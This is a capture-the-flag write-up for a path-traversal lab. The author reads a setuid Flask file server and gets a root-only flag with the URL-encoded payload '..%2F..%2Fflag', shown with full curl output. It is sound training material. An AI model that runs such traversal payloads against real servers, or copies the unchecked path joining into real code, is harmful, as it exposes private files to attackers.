## Exercise:
This level will explore the intersection of Linux path resolution, when done naively, and unexpected web requests from an attacker. We've implemented a simple web server for you --- it will serve up files from /challenge/files over HTTP. Can you trick it into giving you the flag?

The web server program is `/challenge/server`. You can run it just like any other challenge, then talk to it over HTTP (using a different terminal or a web browser). We recommend reading through its code to understand what it is doing and to find the weakness!

## Solution
The first thing I do is to check the permissions for the server file:
```
> ls -l /challenge/server
-rwsr-xr-x 1 root root 752 Sep  6  2025 /challenge/server
```
As I can see, the owner and the owner group are root, the suid bit is set and I may read and execute files. Therefore at first let me read the file:
```
> cat /challenge/server
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import flask
import os

app = flask.Flask(__name__)


@app.route("/content", methods=["GET"])
@app.route("/content/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
The server is a flask web server which listens on port 80 and accepts GET requests on the /content/<path:path> path. In the function below path is defined as "index.html" therefore the path that I try to request is "http://url/content/index.html".

Because of my execute permissions I run the server to get my flag.
```
> /challenge/server &
[1] 167
hacker@web-security~path-traversal-1:~$  * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://challenge.localhost:80
Press CTRL+C to quit
```
As I can see the url is "http://challenge.localhost:80" and because of that I run:
```
> curl -v -L "http://challenge.localhost:80/content/index.html"
curl -v -L http://challenge.localhost:80/content/index.html
* Host challenge.localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 39862 failed: Connection refused
*   Trying 127.0.0.1:80...
* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 38488
* using HTTP/1.x
> GET /content/index.html HTTP/1.1
> Host: challenge.localhost
> User-Agent: curl/8.21.0
> Accept: */*
>
* Request completely sent off
DEBUG: requested_path='/challenge/files/index.html'
127.0.0.1 - - [28/Aug/2026 10:48:52] "GET /content/index.html HTTP/1.1" 200 -
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Fri, 28 Aug 2026 10:48:52 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 25
< Connection: close
<
Welcome to Web Security!
* shutting down connection #0
```
Interesting is following line:
```
DEBUG: requested_path='/challenge/files/index.html'
```
Our goal is to read the flag, therefore let's check the flag permissions:
```
-r-------- 1 root root 60 Aug 28 10:35 /flag
```
Ok, only root may read them. As we know the sbit of our challenge has been set. Therefore every execution of the program elevates its permissions to root. We also can see that the program reads our input and debug prints its content:
```
@app.route("/content/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
```
Let's try to not give it "/index.html" as intended and let's try to let it print our flag.
We know that the program is searching for files in /challenge/files and we also know that the flag is in /flag.
So let's try this path instead "../../flag".
```
> curl -v -L "http://challenge.localhost:80/content/../../flag"
* Request completely sent off
127.0.0.1 - - [28/Aug/2026 11:01:44] "GET /flag HTTP/1.1" 404 -
< HTTP/1.1 404 NOT FOUND
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Fri, 28 Aug 2026 11:01:44 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 207
< Connection: close
<
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
* shutting down connection #0
```
Oops seems like this won't work as intended, but why?
Well seems like if I try to request this URL is routing to /flag instead of to /content. So what can we do to route to /content but give it a file name with our specified path in it?
First things first, I take a look into the documentation of flask with app.route().
Seems like our approach wasn't completely false but I got the hunch that we need to encode the "/" character to fool the router. The hex ascii value is 2F. Therefore let's try following url:
```
> curl -L -v "http://challenge.localhost:80/content/..%2F..%2Fflag"
* Host challenge.localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 57888 failed: Connection refused
*   Trying 127.0.0.1:80...
* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 47890
* using HTTP/1.x
> GET /content/..%2F..%2Fflag HTTP/1.1
> Host: challenge.localhost
> User-Agent: curl/8.21.0
> Accept: */*
>
* Request completely sent off
DEBUG: requested_path='/challenge/files/../../flag'
127.0.0.1 - - [28/Aug/2026 11:21:27] "GET /content/..%2F..%2Fflag HTTP/1.1" 200 -
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Fri, 28 Aug 2026 11:21:27 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 60
< Connection: close
<
pwn.college{[REDACTED FLAG]}
* shutting down connection #0
```